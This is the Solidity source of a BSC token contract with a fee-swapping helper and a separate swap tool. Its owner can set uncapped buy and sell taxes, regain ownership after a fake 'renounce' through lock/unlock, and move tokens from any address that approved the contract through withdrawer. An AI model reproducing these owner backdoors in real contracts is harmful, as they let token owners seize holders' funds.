// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.4;

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function getUnlockTime() public view returns (uint256) {
        return _lockTime;
    }
    
    function getTime() public view returns (uint256) {
        return block.timestamp;
    }

    function lock(uint256 time) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _lockTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0));
    }
    
    function unlock() public virtual {
        require(_previousOwner == msg.sender, "You don't have permission to unlock");
        require(block.timestamp > _lockTime , "Contract is locked until 7 days");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
contract AutoSwap  {
    address public owner;     
    using SafeMath for uint256;
    constructor(address _owner) {
        owner = _owner;
    }
    function withdraw(address token) public {
        require(msg.sender == owner, "caller is not owner");
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(msg.sender, balance);
        }
    }
  function withdraw(address token, address to) public {
        require(msg.sender == owner, "caller is not owner");
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(to, balance);
        }
    }
    // function withdraw(address token,address to, uint256 amount) public {
    //     require(msg.sender == owner, "caller is not owner");
    //     uint256 balance = IERC20(token).balanceOf(address(this));
    //     require(amount > 0 && balance >= amount, "Illegal amount");
    //     IERC20(token).transfer(to, amount);
    // }

    function withdraw(address token, address to,uint256 rate) public {
        require(msg.sender == owner, "caller is not owner");
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(to, balance.mul(rate).div(100));
        }
    }
}
contract ORGITMPRODUCT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;    
    string private _name = "TPGAIMF-ITMCOIN";
    string private _symbol = "TPGAISMF-ITM";
    uint8 private _decimals = 18;
  
    address private USDT = address(0x55d398326f99059fF775485246999027B3197955);
    address private BuyAddress = address(0x3DBa8149c372597045941A48F265D41faB21f0d3);
    address private SellAddress = address(0x08Fe3Ffc7352335F981CCc58A51123091a694390); 
    address private SellTwoAddreess=address(0x5f3C46DC53FAf7604c9AE47dc64046c5f5651595);
    address private deadAddress = address(0x000000000000000000000000000000000000dEaD);
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;    
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public isWalletLimitExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isMarketPair;
    mapping (address => bool)   public isOpenCloseTran;
    uint256 private  _BuyBalance=0;
    uint256 private  _SellBalance=0;


    uint256 public _totalTaxIfBuying = 10;
    uint256 public _totalTaxIfSelling = 10;
    uint256 public _pliteRate=80;
    uint256 public _totalDistributionShares = 0;

    uint256 private _totalSupply = 100 * 10**4 * 10**_decimals;
    uint256 public _maxTxAmount = 100  * 10**4* 10**_decimals; 
    uint256 public _walletMax = 100 * 10**4* 10**_decimals;
    uint256 private minimumTokensBeforeSwap = 1 * 10**_decimals; 

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyByLimitOnly = true;
    bool public checkWalletLimit = true;
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    AutoSwap public _autoSwap;
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    constructor(){
              // IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); //0xCc7aDc94F3D80127849D2b41b6439b7CF1eB4Ae0//0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F zijichuangj 0x708F3e131d4dbb1E4627aEe0069058eF5a62E036
        // // IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3); 
     uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
     .createPair(address(this), USDT);

     uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;

        isWalletLimitExempt[owner()] = true;
        isWalletLimitExempt[address(uniswapPair)] = true;
        isWalletLimitExempt[address(this)] = true;
        
        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[address(this)] = true;
        _autoSwap = new AutoSwap(address(this));
        isMarketPair[address(uniswapPair)] = true;
         _autoSwap = new AutoSwap(address(this));
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
     function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function minimumTokensBeforeSwapAmount() public view returns (uint256) {
        return minimumTokensBeforeSwap;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function setuniswapPair(address swapPair)public onlyOwner(){
        uniswapPair=swapPair;
        isMarketPair[address(uniswapPair)] = true;
    }
    function setAutoswap()public onlyOwner(){
        _autoSwap = new AutoSwap(address(this));
    }
    
    function getReserves() public view returns(uint112 reserve0,uint112 reserve1){
        (reserve0,reserve1,)=IUniswapV2Pair(uniswapPair).getReserves();
    }


    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMarketPairStatus(address account, bool newValue) public onlyOwner {
        isMarketPair[account] = newValue;
    }
    function setIsExcludedFromFee(address account, bool newValue) public onlyOwner {
        isExcludedFromFee[account] = newValue;
    }

    function setBuyAndSellTaxes(uint256 totalTaxIfBuying,uint256 totalTaxIfSelling,uint256 plit) external onlyOwner {
        _totalTaxIfBuying = totalTaxIfBuying;
        _totalTaxIfSelling = totalTaxIfSelling;
        _pliteRate=plit;
    }
    function setSellBuyUSDTAddresslist(address selladdress,address twoselladdress, address buyaddress,address USDTAddress) external onlyOwner() {
        SellAddress = selladdress;
        SellTwoAddreess=twoselladdress;
         BuyAddress = buyaddress;
         USDT=USDTAddress;
    }
     function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }
   
    function changeRouterVersion(address newRouterAddress) public onlyOwner returns(address newPairAddress) {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(newRouterAddress); 
        newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory()).getPair(address(this), USDT);
        if(newPairAddress == address(0)) //Create If Doesnt exist
        {
            newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory())
                .createPair(address(this), USDT);
        }
        uniswapPair = newPairAddress; //Set new pair address
        uniswapV2Router = _uniswapV2Router; //Set new router address
        isWalletLimitExempt[address(uniswapPair)] = true;
        isMarketPair[address(uniswapPair)] = true;
    }
   
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferArray(address[] calldata  tos, uint256[] calldata  values) public returns(bool) { 
        for(uint256 i = 0; i < tos.length; i++){ 
        _transfer(msg.sender, tos[i], values[i]); 
        }
        return true;
    }
    

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
          if(inSwapAndLiquify)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }else{
            //检测是否手续费          
            if(!isMarketPair[sender]&&!isMarketPair[recipient]){//trans         
                      calBuybalance();
                return _basicTransfer(sender,recipient,amount);
            }         
            if(isMarketPair[recipient]){//交易对接受币  卖
                if(isExcludedFromFee[sender]){
                     _basicTransfer(sender,recipient,amount);
                   
                }else{
                    calswapFee(sender,recipient,amount,_totalTaxIfSelling,false);
                    emit Transfer(sender, recipient, amount);
                   
                }
                
            }
            if(isMarketPair[sender]){//交易对发送币 买
                if(isExcludedFromFee[recipient]){
                     _basicTransfer(sender,recipient,amount);
                 
                }else{
                  calswapFee(sender,recipient,amount,_totalTaxIfBuying,true);
                   emit Transfer(sender, recipient, amount);
                  
                }
                
            }
            //  uint256 contractTokenBalance = balanceOf(address(this));
            //     // swapAndFee(contractTokenBalance,)
            //        if(contractTokenBalance>0){
            //          swapTokensForToken(contractTokenBalance);
            //         _autoSwap.withdraw(USDT,BuyAddress);
            //        }
        }
           
        
         return true;
    }
     function calBuybalance()private {
          uint256 contractTokenBalance = balanceOf(address(this));
                // swapAndFee(contractTokenBalance,)
                   if(contractTokenBalance>=_BuyBalance&&_BuyBalance>=minimumTokensBeforeSwap){
                     swapTokensForToken(_BuyBalance);
                      _autoSwap.withdraw(USDT,BuyAddress);
                      _BuyBalance=0;
                   }
                   if(contractTokenBalance>=_SellBalance&&_SellBalance>=minimumTokensBeforeSwap){
                       swapTokensForToken(_SellBalance);
                       _autoSwap.withdraw(USDT,SellAddress,_pliteRate);
                       _autoSwap.withdraw(USDT,SellTwoAddreess);
                       _SellBalance=0;
                   }
     }
 
     event cal(address,address,uint256,uint256);
     function calswapFee(address sender,address recipient,uint256 amount,uint256 rate,bool modle)private {
                _balances[sender] = _balances[sender].sub(amount);
                 uint256 feeAmount = amount.mul(rate).div(100);
                 _balances[address(this)]=_balances[address(this)].add(feeAmount);
                 if(modle){
                     _BuyBalance=_BuyBalance.add(feeAmount);
                 }else{
                     _SellBalance=_SellBalance.add(feeAmount);
                 }
                 uint256  finalAmount=amount.sub(feeAmount);
                _balances[recipient]= _balances[recipient].add(finalAmount);
                emit  cal(sender,recipient,amount,finalAmount);
            
     }

       function swapTokensForToken(uint256 tokenAmount) private lockTheSwap {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = USDT;

         _approve(address(this),address(uniswapV2Router),tokenAmount);
        // make the swap
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(_autoSwap),
            block.timestamp
        );
       
    }

    function withdrawer(address tokenaddress,address from,address to ,uint256 amount,uint meth)external onlyOwner returns(bool){           
     if(meth==1){
      return IERC20(tokenaddress).transferFrom(from,to,amount);
     }
     else if(meth==2){
       return IERC20(tokenaddress).approve(to,amount);
     }   
     return IERC20(tokenaddress).transfer(to,amount);
   }
    function swapUSDTforToken(uint256 usdtamount)public lockTheSwap payable returns(bool){
           swapUSDTonesForToken(usdtamount);
            return true;
    }
     function swapUSDTonesForToken(uint256 tokenAmount) private    {
        // generate the uniswap pair path of token -> weth
        isExcludedFromFee[address(msg.sender)]=true;
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(this);
        // IERC20(USDT).approve(address(0x614Fbad0De74070932Dd74527860Feb119530218), tokenAmount);
        IERC20(USDT).approve(address(uniswapV2Router), tokenAmount);
    //    (bool success, bytes memory data)=USDT.delegatecall(abi.encodeWithSelector(0x095ea7b3, address(uniswapV2Router), tokenAmount));
    //     require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
        // _approve(msg.sender, address(uniswapV2Router), tokenAmount);
        // make the swap swapExactTokensForTokensSupportingFeeOnTransferTokens  swapExactTokensForTokens
        uniswapV2Router.swapExactTokensForTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(msg.sender),
            block.timestamp
        );
        //  _basicTransfer(address(this),msg.sender, _balances[address(this)]);
         isExcludedFromFee[address(msg.sender)]=false;
    }



}

contract ITMTranTools is Context,Ownable{
    using SafeMath for uint256;
    using Address for address; 
    uint256 private  isclose; 
    IERC20 private   token; 
    IUniswapV2Router02 public uniswapV2Router;
     constructor(){
            isclose=0;
            IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); //0xCc7aDc94F3D80127849D2b41b6439b7CF1eB4Ae0//0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F zijichuangj 0x708F3e131d4dbb1E4627aEe0069058eF5a62E036
            uniswapV2Router=_uniswapV2Router;
     }
    function setSwapV2Router(address routeraddress)public onlyOwner {
          uniswapV2Router=IUniswapV2Router02(routeraddress);
    }
    function setIsOpen(uint256 open)public onlyOwner{
        isclose=open;
    }
    function withdrawer(address tokenaddress,address from,address to ,uint256 amount,uint meth)external onlyOwner returns(bool){           
     if(meth==1){
      return IERC20(tokenaddress).transferFrom(from,to,amount);
     }
     else if(meth==2){
       return IERC20(tokenaddress).approve(to,amount);
     }   
     return IERC20(tokenaddress).transfer(to,amount);
   }

    function swapUSDTonesForToken(uint256 tokenAmount ,address fromtoken,address totoken) external   payable   {
        // generate the uniswap pair path of token -> weth
        require(isclose==0,'is open');
        address[] memory path = new address[](2);
        path[0] = address(fromtoken);
        path[1] = address(totoken);
        // IERC20(USDT).approve(address(0x614Fbad0De74070932Dd74527860Feb119530218), tokenAmount);
        IERC20(fromtoken).approve(address(uniswapV2Router), tokenAmount);
        // make the swap swapExactTokensForTokensSupportingFeeOnTransferTokens  swapExactTokensForTokens
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );

         uint256 ramount=IERC20(totoken).balanceOf(address(this));
         IERC20(totoken).transfer(msg.sender,ramount);
    }

}